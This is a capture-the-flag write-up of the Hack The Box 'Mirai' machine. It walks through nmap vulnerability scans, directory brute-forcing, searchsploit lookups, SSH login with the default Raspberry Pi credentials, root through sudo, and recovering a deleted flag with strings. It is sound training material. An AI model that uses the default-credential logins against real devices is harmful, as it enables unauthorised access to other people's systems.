# References
1. [Mirai Writeup (medium.com)](https://medium.com/@fularam.prajapati/hack-the-box-mirai-walkthrough-writeup-oscp-ca574732f0bf)

# Summary
### 1. NMAP
NMAP revealed a couple of ports, Port 22 SSH, Port 53 DNS, Port 80 HTTP and Port 1075 UPNP. Port 1075 is some sort of IoT device, the most interesting of them all.

### 2. Port 80 HTTP Enumeration
Upon adding the IP to `/etc/hosts` file, we see an error on the page, but also know that Pi-hole is running. Dirbuster also revealed an admin page that we could visit.

### 3. Port 1075 UPNP Enumeration
Port 1075 did not have a UI, and searchsploits on `platinum upnp` or `pi-hole` did not reveal anything that we could potentially use.

### 4. Port 22 SSH Enumeration
Since we have not gotten any credentials, we check for default passwords. Indeed, the default password for SSH into the pi-hole worked.

### 5. Getting Flags
We find our user flag easily. Privilege escalation to root was also easy as we are basically root. Unforunately, the flag wasn't as straightforward, and the creator mentioned that the flag could be saved in a USB drive. Doing `df -h`, we see the USB drive but the flag was no where to be found. However, performing string on the filesystem mount reveals the root flag.

# Attack
## 1. NMAP
Insert TEXT.. ?
```
hippoeug@kali:~$ nmap --script vuln 10.129.92.103 -sC -sV -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-06 18:06 +08
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
53/tcp   open  domain  dnsmasq 2.76
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    lighttpd 1.4.35
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: lighttpd/1.4.35
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:lighttpd:lighttpd:1.4.35: 
|       CVE-2019-11072  7.5     https://vulners.com/cve/CVE-2019-11072
|       CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052
|_      CVE-2015-3200   5.0     https://vulners.com/cve/CVE-2015-3200
1075/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Ha! How does combining both my old NMAP command lines together look? Anyways, 4 ports are opened. Port 22 SSH, Port 53 DNS, Port 80 HTTP, and Port 1075 UPNP.

Googling "UPNP", we see that it stands for "Universal Plug and Play". UPNP is a set of networking protocols that permits networked devices, such as personal computers, printers, Internet gateways, Wi-Fi access points and mobile devices to seamlessly discover each other's presence on the network and establish functional network services.

## 2. Port 80 HTTP Enumeration
Visiting `http://10.129.92.103:80`, the page loads successfully but it is just a blank white screen. Thinking it might be similar to [Bank](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Bank.md) exercise, we add it to our `/etc/hosts` file.
```
hippoeug@kali:~$ sudo nano /etc/hosts
[sudo] password for hippoeug: 
  GNU nano 4.9.3                                                                 /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.92.103 mirai.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Visiting `http://mirai.htb` now, the page loads but we get an error message.
```
Website Blocked
Access to the following site has been blocked:
mirai.htb
If you have an ongoing use for this website, please ask the owner of the Pi-hole in your network to have it whitelisted.
This page is blocked because it is explicitly contained within the following block list(s):
Go back Whitelist this page Close window
Generated Sat 10:10 AM, Feb 06 by Pi-hole v3.1.4
```
At least this is progress! We know there is a `Pi-hole v3.1.4` running.

Time for some GoBuster!
```
hippoeug@kali:~$ gobuster dir -u "http://mirai.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mirai.htb
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/06 18:37:59 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://mirai.htb/bc6ce6e8-e7f1-4d73-a4ac-a817a2ba5835 => 200. To force processing of Wildcard responses, specify the '--wildcard' switch
```
This didn't work. Weird. Let's not use the domain name, but the IP itself.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.92.103" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.92.103
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/06 18:44:36 Starting gobuster
===============================================================
/admin (Status: 301)
/versions (Status: 200)
===============================================================
2021/02/06 18:54:14 Finished
===============================================================
```
Interesting, two directories, `/admin` & `/versions`.

Let's visit `http://10.129.92.103/admin` first. It is a Pi-hole admin console page. This took a long time to load as well.
```
Pi-hole

Status
Active
Load:  0  0.04  0.04
Memory usage:  39.7 %

    MAIN NAVIGATION
    Dashboard
    Login
    Donate

Queries over last 24 hours
Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10
Donate if you found this useful.
```
Nothing interesting here, except the Login page. Let's visit that.
```
Pi-hole

Sign in to start your session

    Return → Log in and go to requested page (login)
    Ctrl+Return → Log in and go to Settings page


Forgot password
Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10
Donate if you found this useful.
```
Interesting. However, the password for the dashboard web interface is randomized and there isn't a default password we could try. We will have to look into this again.

Next to `http://10.129.92.103/versions`. Navigating here prompts us to download a file, `application/octet-stream (13 bytes)`. In the file which we downloaded, we see a weird string. What's this cryptic shit?
```
1616248250,,,
```

## 3. Port 1075 UPNP Enumeration
Unfortunately, we were not able to get a response from `10.129.92.103:1075`.

Since we were at this stage, let's do a `searchsploit platinum upnp`. We didn't get any useful results.
```
hippoeug@kali:~$ searchsploit platinum upnp
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Genexis Platinum 4410 Router 2.1 - UPnP Credential Exposure                                                                         | hardware/remote/49075.py
Platinum SDK Library - POST UPnP 'sscanf' Buffer Overflow (PoC)                                                                     | multiple/dos/15346.c
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We also try searching for the Pi-hole version which we saw earlier.
```
hippoeug@kali:~$ searchsploit pi-hole
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Pi-Hole - heisenbergCompensator Blocklist OS Command Execution (Metasploit)                                                         | php/remote/48491.rb
Pi-hole 4.3.2 - Remote Code Execution (Authenticated)                                                                               | python/webapps/48727.py
Pi-hole 4.4.0 - Remote Code Execution (Authenticated)                                                                               | linux/webapps/48519.py
Pi-hole < 4.4 - Authenticated Remote Code Execution                                                                                 | linux/webapps/48442.py
Pi-hole < 4.4 - Authenticated Remote Code Execution / Privileges Escalation                                                         | linux/webapps/48443.py
Pi-Hole Web Interface 2.8.1 - Persistent Cross-Site Scripting in Whitelist/Blacklist                                                | linux/webapps/40249.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
However, from my understanding, these exploits require authentication into the admin panel etc to be able to exploit. Needa look elsewhere.

## 4. Port 22 SSH Enumeration
Since we have not found any passwords thus far, let's just try a default Pi-hole password. From Google, we found `username:pi` and `password:raspberry` for SSH.
```
hippoeug@kali:~$ ssh pi@10.129.116.150
The authenticity of host '10.129.116.150 (10.129.116.150)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.116.150' (ECDSA) to the list of known hosts.
pi@10.129.116.150's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ 
```
Ooh, just like that? 

## 5. Getting Flags
Let's find the first flag.
```
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
ff837707441b257a20e32199d7c8838d
```
And the root flag. But first we need to switch to root.
```
pi@raspberrypi:/ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    
pi@raspberrypi:/ $ sudo id
uid=0(root) gid=0(root) groups=0(root)

pi@raspberrypi:~ $ sudo -i

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

root@raspberrypi:~#
```
Or just switching user, but not as cool or efficient.
```
pi@raspberrypi:/ $ su root
Password: (raspberry)
root@raspberrypi:/# 
```
We're root now.
```
root@raspberrypi:/# ls
bin   dev  home        initrd.img.old  lost+found  mnt  persistence.conf  root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             media       opt  proc              run   srv   tmp  var  vmlinuz.old
root@raspberrypi:/# cd root
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```
Ooh, this is special.

Let's look for the USB device with `df -h`. Alternatively, we could use something like `lsusb` as well.
```
root@raspberrypi:/# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  34% /
tmpfs           100M  4.8M   96M   5% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     0  250M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           250M  8.0K  250M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           250M     0  250M   0% /sys/fs/cgroup
tmpfs           250M  8.0K  250M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            50M     0   50M   0% /run/user/999
tmpfs            50M     0   50M   0% /run/user/1000
root@raspberrypi:/# cd /media/usbstick
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
root@raspberrypi:/media/usbstick# ls -la
total 18
drwxr-xr-x 3 root root  1024 Aug 14  2017 .
drwxr-xr-x 3 root root  4096 Aug 14  2017 ..
-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
drwx------ 2 root root 12288 Aug 14  2017 lost+found
root@raspberrypi:/media/usbstick# cd lost+found
root@raspberrypi:/media/usbstick/lost+found# ls
```
Unforunately, we didn't find anything here and I got stuck here. Needed to look for some hints.

Turns out, all we needed to do was to string it as the file did exist at one point, it is safe to assume the data may still be in the image.
```
root@raspberrypi:/media/usbstick# strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```
And we found the root flag within!
